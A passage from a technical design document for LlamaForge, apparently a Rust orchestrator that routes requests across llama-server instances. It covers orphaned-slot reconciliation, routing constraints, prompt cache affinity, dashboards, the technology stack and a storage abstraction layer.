  // the slot is orphaned and must be erased.
  
  // Step 4: Build the set of slots that LlamaForge currently owns.
  let known_slots: HashSet<u32> = slot_dispatch_map
      .slots_for_server(&server_id);
  // NOTE: slot_dispatch_map is HashMap<(ServerId, SlotId), (RequestId, Instant)>.
  // We extract all slot IDs for this server. This is O(N) where
  // N = map size (typically <100 entries).
  
  // Step 5: For each backend-reported active slot, if LlamaForge has no
  // record of it AND it has been active for longer than the grace period,
  // issue an erase command.
  //
  // CRITICAL: The grace period must account for long-context prefills.
  // A 128K-token prefill on consumer hardware (CPU, or small GPU) can take
  // 30-300 seconds. During this entire window, if the request was dispatched
  // with id_slot = -1 (auto-assignment), the slot_dispatch_map has no entry
  // for the specific slot — only a "pending discovery" sentinel keyed by
  // request_id. The reverse pass MUST NOT erase slots that could belong to
  // unresolved dispatch tracker entries.
  //
  // Two-layer protection:
  // 1. If the server has ANY unresolved dispatch entries (entries in
  //    DispatchTracker.ids that are NOT yet mapped to a specific slot in
  //    slot_dispatch_map), skip erasure entirely for this server — we cannot
  //    distinguish an orphaned slot from one owned by an unresolved dispatch.
  // 2. For servers with all dispatches resolved, use a dynamic grace period:
  //    max(30s, ctx_size / 500) where ctx_size is from the server config.
  //    This covers worst-case prefill duration on any hardware.
  
  let unresolved_dispatches: usize = tracker.ids.iter()
      .filter(|rid| slot_dispatch_map.get_slot_for_request(rid).is_none())
      .count();
  
  let dynamic_grace_secs = if unresolved_dispatches > 0 {
      // Cannot safely erase ANY slot on this server — skip entirely.
      // Log for visibility but do NOT erase.
      tracing::debug!(
          server_id = %server_id,
          unresolved = unresolved_dispatches,
          "reverse reconciliation: skipping — server has unresolved dispatch entries"
      );
      u64::MAX // effectively infinite — skip all erasures this cycle
  } else {
      // All dispatches resolved — use dynamic grace based on context size.
      // ctx_size / 500 ≈ worst-case prefill seconds on slow hardware.
      let ctx_based = server_config.ctx_size as u64 / 500;
      std::cmp::max(30, ctx_based)
  };
  
  let now = Instant::now();
  for slot in slots_response.iter().filter(|s| s.is_processing) {
      if !known_slots.contains(&slot.id) {
          // NOTE: llama-server's /slots response does NOT include a `started_at` timestamp.
          // Internal time fields (t_start_process_prompt, t_start_generation) exist on the
          // server struct but are not serialized in the HTTP response. Instead, LlamaForge
          // maintains a local `first_seen_processing` map that records when it first observed
          // a slot in is_processing state. This is the safe direction: if a slot became active
          // between polls (e.g., active for 3s before first observation), the local clock
          // starts late, making the effective grace period longer, not shorter.
          let age = now.duration_since(
              *first_seen_processing
                  .entry((server_id.clone(), slot.id))
                  .or_insert(now)  // first observation — start the clock
          );
          if age > Duration::from_secs(dynamic_grace_secs) {
              tracing::warn!(
                  server_id = %server_id,
                  slot_id = slot.id,
                  id_task = slot.id_task, // observed from /slots, not injected
                  age_secs = age.as_secs(),
                  "reverse reconciliation: erasing orphaned slot unknown to LlamaForge"
              );
              // Fire-and-forget erase — failure is logged, slot will be
              // retried on the next reconciliation cycle.
              let client = Arc::clone(&http_client);
              let url = format!("{}/slots/{}?action=erase", server_base_url, slot.id);
              tokio::spawn(async move {
                  let _ = client.post(&url)
                      .timeout(Duration::from_secs(2))
                      .send().await;
              });
              ORPHAN_SLOTS_ERASED.with_label_values(&[&server_id]).inc();
          }
      }
  }
  ```
  
  > **Why not `DashSet::retain()`?** `retain()` iterates all shards while holding write locks, blocking any concurrent `DispatchToken::release()` (which also needs a write lock on the target shard). If the reconciliation set is large (e.g., 50 tracked requests across 64 shards), the lock hold time is long enough to stall Tokio worker threads waiting on `release()`. The snapshot-then-remove pattern holds each shard's read lock only during the initial `iter().collect()` (microseconds per shard), then performs individual `remove()` calls that each lock only one shard for the duration of a single entry removal. This keeps the contention window to single-entry granularity.
  
  This **bidirectional reconciliation** is immune to the underflow bug because removals are driven by set membership, not arithmetic on a standalone counter. The `AtomicU32` can never drift below the `DashSet` size because every code path that modifies one also modifies the other (RAII guard + forward reconciliation). The reverse pass closes the "ghost request" TOCTOU gap: even if the `DispatchToken` RAII guard removes the request from the DashSet before the cancellation record reaches the forwarder (or the cancellation channel is full and `try_send()` drops it), the orphaned backend slot is caught within one reconciliation cycle (5 seconds) because the reverse pass iterates from the backend's perspective, not LlamaForge's.
  
  > **Why a dynamic grace period?** The reverse pass must not erase slots during legitimate long prefills. A 128K-context request on consumer hardware (CPU backend, or small GPU without FlashAttention) can take 30-300 seconds of pure prefill with no decoded tokens. A fixed 10-second grace period would kill these requests mid-prefill. The two-layer protection ensures safety: (1) if the server has ANY unresolved dispatch entries (dispatched but not yet slot-assigned — common with `id_slot = -1` auto-assignment), the reverse pass skips the entire server; (2) for fully-resolved servers, the grace period scales with `ctx_size`: `max(30s, ctx_size / 500)`. A 128K-context server gets `max(30, 262144/500) = 524s` — safely exceeding worst-case prefill on any hardware. The `first_seen_processing` map tracks when each orphan candidate was first observed. Because the clock starts at first observation (not at actual task start), the effective grace period is always longer than computed — never shorter.
  
  > **Metric:** `llamaforge_orphan_slots_erased_total{server_id}` counts reverse-pass erasures. Under normal operation this counter should be zero. A non-zero sustained rate indicates a systemic issue with cancellation delivery (e.g., audit pipeline chronically stalled).

The routing algorithm uses `max(0, idle_slots_from_last_poll - tracker.count())` as the effective idle slot count. The `tracker.count()` call is a single `AtomicU32::load(Acquire)` — O(1), lock-free, and zero contention regardless of concurrent routing decisions. This ensures that the second request in a burst sees one fewer slot than the first, preventing routing dogpiles without requiring real-time slot queries.

**Server Capabilities (populated from `/props` during health checks):**

Each server maintains a `capabilities` struct discovered at runtime:

```rust
struct ServerCapabilities {
    multimodal: bool,          // true if mmproj_path is loaded (from /props)
    embedding: bool,           // true if --embedding flag is set
    reranking: bool,           // true if reranking model loaded
    loaded_lora_adapters: Vec<String>,  // resolved adapter names (from /lora-adapters paths → name resolution)
}
```

**Hard routing constraints (checked before scoring -- any failure eliminates the server):**

1. **Model match:** Server must serve the requested model M.
2. **Server state:** Server must be in `Running` state.
3. **Multimodal:** If the request contains `ImageUrlPart` or `InputAudioPart` content, the server MUST have `capabilities.multimodal == true`. Requests with multimodal content are rejected with `INVALID_ARGUMENT` if no multimodal-capable server serves the requested model.
4. **LoRA adapter:** If `RequestMetadata.lora_adapter` is set, the server MUST have the requested adapter in `capabilities.loaded_lora_adapters`. Requests for unavailable adapters are rejected with `NOT_FOUND`.
5. **Embedding capability:** If the request is an `EmbedRequest`, the server MUST have `capabilities.embedding == true` (i.e., launched with `--embedding`). A chat/completion-only server cannot produce embeddings — routing to one results in an immediate downstream HTTP 400 from `llama-server`. Requests are rejected with `INVALID_ARGUMENT` if no embedding-capable server serves the requested model.
6. **Reranking capability:** If the request is a `RerankRequest`, the server MUST have `capabilities.reranking == true` (i.e., launched with a reranking model). Requests are rejected with `INVALID_ARGUMENT` if no reranking-capable server serves the requested model.

> **Capability validation order:** Constraints are evaluated in the order listed (model → state → multimodal → LoRA → embedding → reranking). The first failing constraint produces the rejection error. This ordering is deliberate: model match and server state are O(1) lookups that eliminate most candidates cheaply before checking the more specific capability flags.

> **Recurrent model note:** For servers with `model_architecture = "recurrent"` (Mamba, RWKV, etc.), the `kv_cache_usage` and `prompt_cache_affinity` scoring components are zeroed because recurrent models maintain hidden state rather than KV cache. There is no prefix caching to exploit, no context shifting, and state persistence semantics differ fundamentally. The routing score for recurrent servers reduces to slot availability and deferred ratio only.

> **Speculative decoding note:** Servers with `speculative_method != "none"` have different throughput characteristics -- higher tokens/s but potentially higher TTFT due to draft model overhead. The routing algorithm does not currently differentiate, but operators should account for this when interpreting per-server metrics.

### 10.3 Prompt Cache Affinity

llama-server reuses KV cache entries when consecutive requests share a prompt prefix. LlamaForge implements prompt cache affinity in two tiers, allowing v1.0 deployments to capture the majority of cache reuse benefit with minimal complexity:

**Tier 1 — Session Affinity + System Prompt Hash (v1.0, ship first):**

The dominant cache reuse pattern in production is multi-turn conversation: requests within the same session share an ever-growing prompt prefix. Session-level affinity captures this with zero hash computation and zero `/tokenize` calls:

- Maintain a `HashMap<SessionId, ServerId>` that routes all requests from the same session to the same server (where `SessionId` is derived from the `session_id` request field or, for OpenAI-compatible clients, a hash of the first message).
- Additionally, compute a single **64-token system prompt hash** per request. Requests from *different* sessions sharing the same system prompt (common in chatbot/agent workloads) benefit from a lightweight affinity signal. The 64-token hash covers the system prompt preamble — the most commonly shared prefix across sessions.
- Session affinity is invalidated when the target server enters `Draining` or `Failed` state. The session is re-routed to the highest-scoring available server, and the affinity entry is updated.
- LlamaForge passes `cache_prompt: true` to llama-server by default and sets `--slot-prompt-similarity 0.5` in the server config so that llama-server's internal prompt cache matching complements the orchestrator-level routing.

This tier covers ~90% of cache reuse benefit for the dominant workload (multi-turn chat). It adds one HashMap lookup to the routing path — negligible overhead.

**Tier 2 — Hierarchical 4-Level Prefix Hash (v1.1, for advanced workloads):**

For workloads with many distinct sessions sharing long common prefixes (RAG pipelines with shared document context, multi-agent systems with shared tool descriptions, batch processing with identical system prompts), the full hierarchical hash provides finer-grained affinity:

- When a request completes, compute hashes at four **character-count boundaries**: **256, 1024, 4096, and 16384 characters** (approximating 64, 256, 1024, and 4096 tokens at ~4 chars/token). Store each hash associated with the server that processed it. **Critical:** Both storage and routing MUST use the same character-count boundaries — not actual token boundaries. Using exact token boundaries for storage but character-count approximation for routing would produce different hashes for the same text (BPE tokenization is non-uniform), causing zero cache hits. The ~4 chars/token approximation is deliberately coarse; the goal is prefix locality (same prefix → same hash), not exact token-boundary alignment.
- When routing a new request, compute the same four character-count hashes from the raw prompt text and check for matches per server. This requires NO tokenization — hashes are computed directly from the UTF-8 text at fixed character offsets, making routing O(1) with respect to model vocabulary.
- The affinity score is weighted by match depth: a 4096-token prefix match scores higher (0.95) than a 64-token match (0.3). This enables fine-grained routing: two requests sharing a 1024-token system prompt but differing at token 1025 still get a strong affinity signal.
- The prefix hash cache is an LRU per server, with capacity = 10× total slots across all servers.

| Match Depth (chars ≈ tokens) | Affinity Score |
|------------------------------|----------------|
| 16384 chars (≈4096 tokens) | 0.95 |
| 4096 chars (≈1024 tokens) | 0.75 |
| 1024 chars (≈256 tokens) | 0.50 |
| 256 chars (≈64 tokens) | 0.30 |
| No match | 0.00 |

> **Context shift caveat:** When `ctx_shift = true` (the default), llama-server may perform a context shift when the KV cache is full — discarding tokens from the middle of the context to make room while retaining the system prompt prefix. A context shift does **not** invalidate all prefix hashes — only hashes at depths greater than the retained contiguous prefix.
>
> **Critical: use system prompt boundary, not `retained_tokens` count.** An earlier design used `kv_cache_tokens_count_after_shift` as the retained prefix length. This is incorrect: after a context shift, `llama-server` retains the **system prompt tokens** (contiguous from position 0) plus some suffix of the most recent tokens, with a gap in the middle where tokens were discarded. The `kv_cache_tokens_count` reports the **total** remaining tokens (system prefix + retained suffix), not the contiguous prefix length. Using this total as the invalidation boundary would incorrectly preserve hashes that span the gap — e.g., a 1024-token hash that covers positions 0-1023 where positions 300-700 have been evicted.
>
> The correct invalidation boundary is the **system prompt token count**, obtained by calling the backend's **`POST /tokenize`** endpoint. LlamaForge does NOT attempt to estimate token counts from text length or character heuristics — BPE and SentencePiece tokenizers have model-specific vocabularies that make text-based estimation mathematically impossible without the exact `.gguf`'s vocabulary.
>
> **Critical: `/tokenize` is NEVER called during request admission.** An earlier design called `/tokenize` "during request admission" to compute the system prompt token boundary. This is fatally flawed for three reasons: (1) at admission time, the request hasn't been scheduled — you don't know which server (and therefore which model/tokenizer) will handle it; (2) it injects external network latency into the gateway's ingress fast-path; (3) if all backends are busy, offline, or deadlocked, the `/tokenize` call times out and the client's request fails admission with HTTP 504 — coupling queue admission directly to backend availability, which is the exact problem the queue exists to solve.
>
> Instead, the `/tokenize` call happens **lazily after dispatch** as a **detached background task** — specifically, the proxy task spawns `POST /tokenize` via `tokio::spawn()` and does NOT await it. The tokenization result is cached in a `DashMap<(ModelName, SystemPromptHash), u32>` shared across all proxy tasks. On cache hit (the common case for repeated system prompts in multi-turn chat and agent workloads), no `/tokenize` call is made at all. On cache miss, the detached task populates the cache asynchronously — the streaming response is never blocked waiting for tokenization.
>
> ```rust
> // On cache miss: fire-and-forget tokenization. The proxy stream
> // proceeds immediately to /completion without waiting.
> let cache = Arc::clone(&system_prompt_token_cache);
> let client = Arc::clone(&http_client);
> let model = model_name.clone();
> let prompt_hash = system_prompt_hash;
> let tokenize_url = format!("{}/tokenize", server_base_url);
> let prompt_text = system_prompt_text.clone();
> tokio::spawn(async move {
>     match client.post(&tokenize_url)
>         .json(&serde_json::json!({ "content": prompt_text }))
>         .timeout(Duration::from_secs(5))
>         .send().await
>     {
>         Ok(resp) => {
>             if let Ok(body) = resp.json::<TokenizeResponse>().await {
>                 cache.insert((model, prompt_hash), body.tokens.len() as u32);
>             }
>         }
>         Err(e) => {
>             tracing::debug!(error = %e, "background /tokenize failed — cooldown before retry");
>             // Record failure with timestamp to prevent retry storms.
>             tokenize_fail_cache.insert((model, prompt_hash), Instant::now());
>         }
>     }
> });
> // Proxy stream continues to POST /completion here — no join!, no await.
> ```
>
> **`/tokenize` failure cooldown:** To prevent retry storms under sustained `/tokenize` outage (e.g., backend alive but `/tokenize` handler deadlocked), a per-`(model, prompt_hash)` failure cache records the last failure timestamp. On cache miss, the `/tokenize` call is skipped if the last failure for the same key was less than 60 seconds ago. This bounds retry rate to once per minute per unique system prompt regardless of request volume:
>
> ```rust
> // Before firing /tokenize:
> if let Some(last_fail) = tokenize_fail_cache.get(&(model.clone(), prompt_hash)) {
>     if last_fail.elapsed() < Duration::from_secs(60) {
>         return; // Skip — too soon after last failure
>     }
> }
> ```
>
> If `/tokenize` fails (timeout, backend error), the cache entry is not populated and context shift invalidation falls back to **full invalidation** (purge all hierarchical hashes for the slot) — a conservative but safe default.
>
> **Rejected alternative: `tokio::join!` with `/completion`.** An earlier design used `tokio::join!(tokenize_future, completion_future)` to run both concurrently. This is subtly broken: `tokio::join!` resolves only when **both** futures complete. While `/completion` streams tokens immediately via continuous batching, the joined future cannot yield the first token until `/tokenize` also finishes. For a 32K-token prompt, BPE/SentencePiece tokenization on `llama-server`'s HTTP thread pool can take 100-500ms — injecting that latency directly into TTFT. Since the tokenization result is only needed for *future* context shift invalidation (not for the current request's generation), there is no reason to block the streaming path on it.
>
> **Context shift detection — heuristic approach:** llama-server's `/slots` response does NOT include a per-slot KV cache token count (`kv_cache_tokens_count` does not exist in the API). The only KV cache metric exposed is the aggregate server-wide `kv_cache_usage_ratio` gauge from `/metrics`. Without a per-slot signal, LlamaForge uses a **predictive heuristic** based on its own dispatch records:
>
> For each slot, LlamaForge tracks the cumulative `(prompt_tokens + completion_tokens)` from all requests it has dispatched to that slot since the last known slot reset (erase). When this cumulative usage exceeds **80% of the slot's `n_ctx`** (the per-slot context size, which equals the server's `ctx_size / parallel_slots` or the server's `ctx_size` if `ctx_shift` is enabled and slots share a contiguous KV cache), a context shift is **predicted** for the next request on that slot.
>
> On predicted context shift, LlamaForge performs **selective invalidation**:
>
> 1. Look up `system_prompt_tokens` from the `(model_name, system_prompt_hash)` cache. If the cache entry exists, use it as the contiguous retained prefix boundary. If not (rare: first request for this system prompt, or `/tokenize` failed), fall back to full invalidation.
> 2. Invalidate all hierarchical hash entries at token boundaries **above** `system_prompt_tokens`. For example, if `system_prompt_tokens = 256`, the 64-token and 256-token hashes remain valid, while the 1024-token and 4096-token hashes are purged.
> 3. This preserves affinity scoring for subsequent requests that share the same system prompt — a common pattern in multi-turn chat and agent workloads — while correctly invalidating all hashes that span the non-contiguous gap created by the context shift.
>
> **Limitation:** This heuristic can mispredict: if llama-server's internal cache management evicts or shifts at a different threshold than 80%, the invalidation timing is off. The safe fallback (full invalidation) ensures correctness at the cost of affinity accuracy. A future upstream enhancement to llama-server (exposing per-slot KV cache token counts in `/slots` responses) would enable precise detection; this is documented as a dependency for v2 context shift optimization.
>
> **[G-16] Threshold firing condition:** The 80% threshold fires only when `cumulative_tokens` crosses the threshold AND `n_decoded` (from `/slots`) shows active generation has stopped or restarted from a lower position. Crossing the threshold mid-generation (cumulative tokens growing during a long completion) does NOT trigger shift detection — the heuristic requires a **discontinuity** in token position, not merely crossing a capacity threshold. Without this guard, a single long-running request generating 4K tokens on a 8K-context slot would falsely trigger shift detection at the 80% mark mid-generation, invalidating prefix hashes while the slot's KV cache is still contiguous and valid.

### 10.4 Request Coalescing (Future)

For embedding requests with identical or near-identical inputs arriving within a short window (< 100ms), LlamaForge can coalesce them into a single downstream request and fan out the response. This is a v2 feature.

---

## 11. Metrics & Observability

### 11.1 Dashboard Views

**Global Overview Dashboard:**

```
┌──────────────────────────────────────────────────────────┐
│                    LlamaForge Dashboard                   │
├──────────────┬──────────────┬──────────────┬─────────────┤
│  Throughput  │   Goodput    │  Queue Depth │  Error Rate │
│  1,247 t/s  │  1,198 t/s   │     3        │   0.4%      │
├──────────────┴──────────────┴──────────────┴─────────────┤
│                                                           │
│  TTFT Distribution (last 5 min)        │ Servers         │
│  ┌──────────────────────────┐          │ ┌────────────┐  │
│  │ P50: 89ms                │          │ │ gpu0: ██▓░  │  │
│  │ P95: 312ms               │          │ │ gpu1: ███▓  │  │
│  │ P99: 1,247ms             │          │ │ gpu2: █▓░░  │  │
│  └──────────────────────────┘          │ └────────────┘  │
│                                                           │
│  Generation TPS (per model, last 5 min)                  │
│  ┌──────────────────────────────────────────────────┐    │
│  │ llama-3.1-8b:  ████████████████████████ 68.4 t/s │    │
│  │ codellama-34b: ████████████ 34.2 t/s              │    │
│  └──────────────────────────────────────────────────┘    │
│                                                           │
│  Evictions: 2 in last hour │ Timeouts: 0 in last hour    │
└──────────────────────────────────────────────────────────┘
```

### 11.2 Grafana Integration

For teams running Prometheus + Grafana, LlamaForge ships a provisioning JSON dashboard that can be imported directly. Key panels:

- Request rate by model and task_type (stacked area)
- TTFT heatmap over time
- Token throughput vs goodput (dual-axis line)
- Queue depth over time with eviction markers
- Per-server slot utilization (heatmap)
- KV cache usage per server (gauge + time series)
- Error rate by error type (stacked bar)

**Distributed Tracing (v1 limitation):**

Distributed tracing (W3C `traceparent`) is not propagated to downstream `llama-server` instances because the backend does not support trace context headers — it would silently ignore them. End-to-end request correlation in v1 uses the `id_task_map` (`LlamaForge request_id` ↔ `llama-server id_task`) populated from `/slots` polling responses. This provides sufficient correlation for single-machine debugging. If `llama-server` adds trace context support in the future, LlamaForge should inject `traceparent` into all downstream HTTP requests (`/completion`, `/v1/chat/completions`, `/embedding`, `/tokenize`) and export spans via OpenTelemetry to enable Jaeger/Zipkin integration.

---

## 12. Technology Stack

### Core Runtime

| Component | Technology | Rationale |
|-----------|-----------|-----------|
| Language | **Rust** (2021 edition) | Memory safety, async performance, zero-cost abstractions |
| Async Runtime | **Tokio** | Industry-standard Rust async runtime |
| gRPC Framework | **tonic** 0.13+ | Pure-Rust gRPC built on Tokio + Tower. Server-side streaming, interceptors, TLS, health checks. Prefer ≥0.13 for best axum 0.8 compatibility (shared `http-body` 1.x types). |
| Protobuf Codegen | **prost** + **tonic-build** | Compile `.proto` → Rust types at build time via `build.rs` |
| HTTP Framework | **axum** 0.8+ | Tower-based; serves OpenAI shim, management REST, Web UI, Prometheus endpoint |
| Serialization | **serde** + **serde_json** + **prost** | serde for JSON (HTTP shim + config), prost for protobuf (gRPC) |
| Config Parsing | **toml** crate | Human-readable config, native Rust support |
| Database | **rusqlite** (with `bundled` feature) | Embedded SQLite, no external DB dependency. SQLite writes run on a dedicated `std::thread` (the writer thread — Section 5.6), bridged from the async `MetricsStore` trait via `WriterCommand` + oneshot. SQLite reads use a `deadpool-sqlite` connection pool for concurrent HTTP queries. Abstracted behind `MetricsStore` and `ConfigOverlayStore` async traits for backend pluggability — see Section 13. A Postgres implementation calls `sqlx` directly (natively async, no writer thread needed). |
| Metrics Export | **prometheus** crate | Standard Prometheus client for Rust |
| Logging | **tracing** + **tracing-subscriber** | Structured, async-aware logging with JSON output |
| UUID | **uuid** crate (v7) | Time-ordered UUIDs for request IDs |
| Process Mgmt | **tokio::process** | Async child process spawn/kill |
| HTTP Client | **reqwest** | For proxying to llama-server (downstream is still HTTP) and health checks. A **per-server** `reqwest::Client` instance is created for each managed `llama-server`, stored in `ArcSwap<reqwest::Client>` within the server's state. Creating a new client per request defeats TCP connection pooling and will exhaust ephemeral ports (`TIME_WAIT` saturation) on localhost. Each client is configured with `pool_idle_timeout(Duration::from_secs(10))` and `pool_max_idle_per_host(parallel_slots)`. **On server restart:** the Server Manager creates a **fresh `reqwest::Client`** and atomically swaps it via `ArcSwap::store()`. This immediately invalidates all stale pooled connections from the old client — new proxy tasks use the fresh client with empty pool, while in-flight tasks on the old client fail-fast with connection reset (triggering their error handling). This eliminates the "pool poisoning" window where stale sockets produce bursts of 503s after restart. The old client is dropped when the last in-flight task completes. |

> **Connection Pool Sizing:** `reqwest` maintains separate connection pools per (scheme, host, port) tuple, so each `llama-server` instance (listening on a distinct port) gets its own pool. `pool_max_idle_per_host` MUST be set to at least `MAX(parallel_slots)` across all configured servers (computed at startup from the config). If set too low (e.g., `2`), a burst of concurrent completions will force `reqwest` to close excess connections after each request. The next burst re-negotiates TCP handshakes for the excess, causing ephemeral port exhaustion and `TIME_WAIT` saturation under sustained throughput. Setting it to `max(MAX(parallel_slots_per_server), 16)` ensures every server's pool can accommodate peak concurrency without churn. Note: using `SUM(parallel_slots)` instead of `MAX` over-provisions the per-host idle limit but is harmless — idle connections consume negligible memory and are evicted by `pool_idle_timeout`.

> **Request Body Limit:** axum (via Tower's `DefaultBodyLimit` layer) imposes a **2MB** limit on incoming request bodies by default. This is far too small for LlamaForge: a 64K-token prompt with complex JSON metadata can easily exceed 2MB, and multimodal requests with base64-encoded images routinely reach 10-50MB. A single high-resolution image in base64 encoding is 10-15MB, so a multi-image vision request (4-5 images for document pages, multi-angle photos, or comparison tasks) can exceed 50MB. The axum router MUST be configured with a **dynamic default** based on the server configuration: if ANY configured server has `multimodal: true` in its capabilities, the default limit is **200MB** (matching common LLM API providers); otherwise the default is **50MB**. This limit applies to the HTTP server only — gRPC (tonic) manages its own message size limits via `tonic::codec::ProstCodec::max_decoding_message_size()`, which uses the same dynamic default. Without an explicit override, clients receive an opaque `HTTP 413 Payload Too Large` before the request even reaches the handler. The **413 error response body** MUST include the current limit for debuggability: `{"error": "request_body_too_large", "max_bytes": 52428800, "received_bytes": 67108864, "hint": "increase max_request_body_bytes in [gateway] config"}`. The limit is configurable via `llamaforge.toml`:
>
> ```toml
> [gateway]
> max_request_body_bytes = 209715200  # 200MB auto-default for multimodal; 50MB otherwise. Override here.
> ```

> **Middleware Isolation:** The `tonic` (gRPC) and `axum` (HTTP) servers run on separate ports with **strictly isolated Tower middleware stacks**. The primary reason is timeout semantics: a generic timeout middleware applied to gRPC server-side streaming would sever long-running completions (which can run for minutes on large `max_tokens` requests). The gRPC stack uses `tonic`'s built-in deadline/keepalive mechanisms; The HTTP stack does NOT use Tower's `TimeoutLayer` for request timeouts — `TimeoutLayer` wraps the entire response body future, which means it will sever a 3-minute streaming generation at the timeout boundary, truncating the JSON payload without a `[DONE]` marker. Instead, `tokio::time::timeout` is applied to the **queue-wait phase** (before streaming begins) and, for non-streaming requests, an **absolute execution timeout** is applied to the entire generation future. Additionally, while both stacks use `http-body` 1.x, their concrete body types differ (`tonic::body::BoxBody` vs `axum::body::Body`), making non-generic middleware require adapter layers.

> **Unary Request Timeout:** For non-streaming requests (`stream: false`), gRPC streaming deadlines do not apply. If `llama-server` deadlocks or hangs during generation, the `reqwest` future will await forever, permanently leaking the Axum connection and the GPU slot. To prevent this, the proxy task wraps the entire generation future (queue wait + prefill + decode + response collection) in `tokio::time::timeout(queue_timeout_secs + max_generation_timeout_secs)`, where `max_generation_timeout_secs` is configurable (default: 300s). If this absolute timeout fires, the request is cancelled with `FINISH_REASON_UPSTREAM_FAILURE` (the timeout is a cluster-side issue — the client's request was valid), the `DispatchToken` RAII guard releases the slot, and the client receives HTTP 504 / gRPC `DEADLINE_EXCEEDED`.

> **[IR-2] Stream Item type:** The `InferenceEngine::chat_completion` stream's `Item` type MUST be `Result<ChatCompletionChunk, StreamError>` (not bare `ChatCompletionChunk`). This allows the type system to enforce mid-stream error handling at every consumption site — callers cannot accidentally ignore backend disconnects, OOM kills, or timeout errors. Without the `Result` wrapper, errors must be encoded as special "sentinel" chunk variants (e.g., a chunk with `finish_reason = "error"`), which downstream code can silently treat as normal chunks. `StreamError` is an enum: `{BackendDisconnect, Timeout, Cancelled, Internal(anyhow::Error)}`.
>
> **`+ 'static` Stream Pattern:** The `InferenceEngine::chat_completion` trait returns `Pin<Box<dyn Stream<Item = Result<ChatCompletionChunk, StreamError>> + Send + 'static>>`. To satisfy `'static`, the returned stream cannot borrow `&self`. Implementations must `Arc::clone()` all shared dependencies (the `reqwest::Client`, queue metrics, `ServerManager`, `DispatchToken`, audit channel sender) and move them into the async stream block. This is an inherent constraint of returning futures across async handler boundaries in axum/tonic.
>
> **Critical: `async_stream::stream!` macro captures by reference.** Unlike a regular `async move {}` block, the `stream!` macro expands to a generator that borrows its environment by reference. Variables declared *outside* the `stream!` block and used *inside* it are borrowed, not moved — even if they appear to be owned `let` bindings. This means naive usage violates the `'static` bound. The fix is to **shadow the clones inside the macro** so the macro's expanded generator owns them:
>
> ```rust
> // Canonical pattern: clone shared state, then shadow inside stream! macro
> let client = Arc::clone(&self.http_client);
> let metrics = Arc::clone(&self.metrics);
> let dispatch_token = DispatchToken::new(Arc::clone(&server.dispatch_tracker), request_id.clone(), server_id.clone());
> let audit_tx = self.audit_tx.clone();
>
> let stream = async_stream::stream! {
>     // Re-shadow to move ownership into the generator.
>     // Without these shadows, `client`, `metrics`, etc. are borrowed from
>     // the outer scope and the stream is not 'static.
>     let client = client;
>     let metrics = metrics;
>     let mut dispatch_token = dispatch_token;
>     let audit_tx = audit_tx;
>
>     let response = client.post(&url).json(&payload).send().await?;
>     // ... proxy tokens ...
>     // NOTE: dispatch_token.release() is NOT called here — it is redundant.
>     // Because dispatch_token is owned by this generator (via the shadow above),
>     // DispatchToken::drop() fires automatically when the generator completes
>     // (on success) or is dropped (on client disconnect / cancellation).
>     // The explicit .release() call at the audit write boundary (Section 5.6)
>     // is a *different* concern: it ensures the slot is freed BEFORE the audit
>     // channel send, not after. Here, we want the slot freed at generator end.
>     drop(dispatch_token); // Explicit drop for clarity, but semantically identical to letting it go out of scope
>     tokio::spawn(async move { audit_tx.send(metrics_record).await });
> };
> Ok(Box::pin(stream))
> ```
>
> This double-declaration pattern is unique to `async_stream` — regular `async move {}` blocks do not need it. Document this in a `// NOTE:` comment at every `stream!` usage site.

### Web UI

| Component | Technology | Rationale |
|-----------|-----------|-----------|
| Framework | **htmx** + **Alpine.js** | Lightweight, fast to develop; embedded static files in binary |
| Charting | **Apache ECharts** (via JS) | Rich, interactive charts; loaded from CDN or embedded |
| CSS | **Tailwind CSS** (embedded) | Utility-first, small bundle |

### External (Optional)

| Component | Technology | Rationale |
|-----------|-----------|-----------|
| Metrics Scraper | **Prometheus** | Time-series DB for operational metrics |
| Dashboarding | **Grafana** | Rich visualization on top of Prometheus |
| Log Aggregation | Any (ELK, Loki, etc.) | Structured JSON logs are compatible with any system |

### Build & Distribution

| Concern | Approach |
|---------|----------|
| Build system | `cargo build --release` |
| Cross-compilation | `cross` for Linux ARM64/x86_64, macOS ARM64 |
| Distribution | Single static binary (musl target for Linux) |
| Container | Multi-stage Dockerfile: build → scratch/distroless |
| Config | TOML files in `/etc/llamaforge/` or `./config/` |

---

## 13. Database Abstraction Layer

LlamaForge v1 ships with SQLite as the only storage backend — it is the right default for a single-binary tool that targets single-machine deployments. However, three SQLite-specific coupling points make a future backend swap (e.g., Postgres for multi-node v2) unnecessarily painful if left unaddressed:

1. **`deadpool-sqlite` + `interact()` pattern.** Every query funnels through `pool.get().await?.interact(|conn| { … }).await?`, a closure that runs on a dedicated `std::thread` because `rusqlite::Connection` is not `Send`. Postgres via `sqlx` uses normal `async fn` calls — there is no `interact()` indirection.
2. **WAL-mode assumptions.** The schema initialization hard-codes `PRAGMA journal_mode=WAL` and `PRAGMA synchronous=NORMAL`. These are SQLite-only concepts with no Postgres equivalent.
3. **Config writeback to TOML.** The in-place `O_TRUNC` + `write_all()` + `fsync()` pattern (Section 5.5) is file-system–specific; a Postgres backend would store runtime overrides in a table.

The abstraction layer isolates these coupling points behind two async traits so that the orchestrator core never imports `rusqlite` or `deadpool-sqlite` directly. v1.0 ships with `SqliteMetricsStore` as the only implementation. The traits exist to prevent SQLite-isms from leaking into the core and to enable Postgres in v1.1 — the v1.1 migration timeline (Section 13.3) shows this is planned within one minor version, so the abstraction pays off quickly.

### 13.1 Trait Definitions

```rust
/// Storage backend for operational metrics, audit events, and process records.
///
/// All methods are &self — implementations manage their own connection pooling.
/// Errors are boxed to avoid leaking backend-specific error types into the core.
pub type StoreError = Box<dyn std::error::Error + Send + Sync + 'static>;

#[async_trait::async_trait]
pub trait MetricsStore: Send + Sync + 'static {
    // --- Audit events ---
    async fn insert_events(&self, events: &[AuditEvent]) -> Result<(), StoreError>;
    async fn query_events(
        &self,
        filter: &EventFilter,
        limit: u32,
        offset: u32,
    ) -> Result<Vec<AuditEvent>, StoreError>;

    // --- Managed processes ---
    async fn upsert_managed_process(&self, proc: &ManagedProcess) -> Result<(), StoreError>;
    async fn remove_managed_process(&self, pid: u32) -> Result<(), StoreError>;
    async fn list_managed_processes(&self) -> Result<Vec<ManagedProcess>, StoreError>;

    // --- Maintenance ---
    async fn prune_events_older_than(&self, cutoff: chrono::DateTime<chrono::Utc>) -> Result<u64, StoreError>;
    async fn estimated_size_bytes(&self) -> Result<u64, StoreError>;
}

#[async_trait::async_trait]
pub trait ConfigOverlayStore: Send + Sync + 'static {
    /// Read all runtime overrides. Returns a map of dotted-key → JSON value.
